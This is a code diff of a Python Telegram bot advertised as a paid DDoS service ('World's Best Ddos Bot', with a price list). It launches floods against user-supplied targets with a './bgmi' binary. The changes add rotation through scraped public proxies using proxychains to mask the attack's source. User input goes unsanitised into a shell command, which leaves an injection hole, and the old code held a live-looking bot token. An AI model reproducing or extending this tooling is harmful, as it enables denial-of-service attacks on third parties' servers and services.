@@ -1,14 +1,16 @@
 #!/usr/bin/python3
-#By Indian Watchdogs @Indian_Hackers_Team
+# By Indian Watchdogs @Indian_Hackers_Team
 
+import random
 import telebot
 import subprocess
 import requests
 import datetime
 import os
+from concurrent.futures import ThreadPoolExecutor
 
-# insert your Telegram bot token here
-bot = telebot.TeleBot('6928006374:AAH5gudHAogy1jzx4_8Z1quh-iQePupBOQc')
+# Insert your Telegram bot token here
+bot = telebot.TeleBot('YOUR_TELEGRAM_BOT_TOKEN')
 
 # Admin user IDs
 admin_id = ["5676702497"]
@@ -19,6 +21,26 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
+# Function to fetch proxies from the API
+def fetch_proxies():
+    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=all"
+    response = requests.get(url)
+    proxies = response.text.split('\n')
+    return [proxy.strip() for proxy in proxies if proxy.strip()]
+
+# Function to check proxy validity
+def check_http_proxy(proxy):
+    url = "http://icanhazip.com"  # URL to test the proxy with
+    proxies = {
+        "http": f"http://{proxy}",
+        "https": f"http://{proxy}",
+    }
+    try:
+        response = requests.get(url, proxies=proxies, timeout=3)
+        if response.status_code == 200:
+            return proxy
+    except requests.RequestException:
+        return None
 
 # Function to read user IDs from the file
 def read_users():
@@ -27,26 +49,6 @@ def read_users():
             return file.read().splitlines()
     except FileNotFoundError:
         return []
-
-# Function to read free user IDs and their credits from the file
-def read_free_users():
-    try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():  # Check if line is not empty
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
-    except FileNotFoundError:
-        pass
-
-
-# List to store allowed user IDs
-allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
@@ -58,7 +60,6 @@ def log_command(user_id, target, port, time):
     
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
-
 
 # Function to clear logs
 def clear_logs():
@@ -107,8 +108,6 @@ def add_user(message):
 
     bot.reply_to(message, response)
 
-
-
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
     user_id = str(message.chat.id)
@@ -132,7 +131,6 @@ def remove_user(message):
 
     bot.reply_to(message, response)
 
-
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_command(message):
     user_id = str(message.chat.id)
@@ -150,8 +148,6 @@ def clear_logs_command(message):
     else:
         response = "Only Admin Can Run This Command."
     bot.reply_to(message, response)
-
- 
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
@@ -177,7 +173,6 @@ def show_all_users(message):
         response = "Only Admin Can Run This Command."
     bot.reply_to(message, response)
 
-
 @bot.message_handler(commands=['logs'])
 def show_recent_logs(message):
     user_id = str(message.chat.id)
@@ -196,7 +191,6 @@ def show_recent_logs(message):
         response = "Only Admin Can Run This Command."
         bot.reply_to(message, response)
 
-
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
     user_id = str(message.chat.id)
@@ -214,45 +208,60 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME = 0
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
-                bot.reply_to(message, response)
-                return
-            # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-        
+        if user_id not in admin_id and user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
+            response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+            bot.reply_to(message, response)
+            return
+        bgmi_cooldown[user_id] = datetime.datetime.now()
+
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 4:
             target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
+            port = int(command[2])
+            time = int(command[3])
             if time > 5000:
                 response = "Error: Time interval must be less than 80."
             else:
+                # Fetch and check proxies for each command
+                proxies = fetch_proxies()
+                with ThreadPoolExecutor(max_workers=1000) as executor:
+                    results = list(executor.map(check_http_proxy, proxies))
+                working_proxies = [proxy for proxy in results if proxy is not None]
+
+                # Ensure there are working proxies available
+                if not working_proxies:
+                    response = "No working proxies found. Please try again later."
+                    bot.reply_to(message, response)
+                    return
+
+                # Select a random working proxy for the attack
+                proxy = random.choice(working_proxies)
+
+                # Using `proxychains` to route the command through a proxy
+                full_command = f"proxychains -q -f <(echo 'http {proxy}') ./bgmi {target} {port} {time} 900"
+                subprocess.run(full_command, shell=True, executable='/bin/bash')
+
+                # Clear the proxies file after use
+                with open("working_proxies.txt", "w") as file:
+                    file.truncate(0)
+
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                start_attack_reply(message, target, port, time)
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"
     else:
         response = "You Are Not Authorized To Use This Command.\nBy Indian Watchdogs @Indian_Hackers_Team"
 
     bot.reply_to(message, response)
-
-
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
@@ -273,7 +282,6 @@ def show_command_logs(message):
         response = "You Are Not Authorized To Use This Command."
 
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
@@ -303,7 +311,6 @@ def welcome_start(message):
     response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy Indian Watchdogs @Indian_Hackers_Team"
     bot.reply_to(message, response)
 
-
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
@@ -325,7 +332,7 @@ Vip :
 > After Attack Limit : 2 Min
 -> Concurrents Attack : 300
 
-Pr-ice List:
+Price List:
 Day-->150 Rs
 Week-->900 Rs
 Month-->1600 Rs
@@ -347,7 +354,6 @@ def welcome_plan(message):
 By Indian Watchdogs @Indian_Hackers_Team
 '''
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
@@ -371,8 +377,5 @@ def broadcast_message(message):
 
     bot.reply_to(message, response)
 
-
-
-
 bot.polling()
-#By Indian Watchdogs @Indian_Hackers_Team
+# By Indian Watchdogs @Indian_Hackers_Team
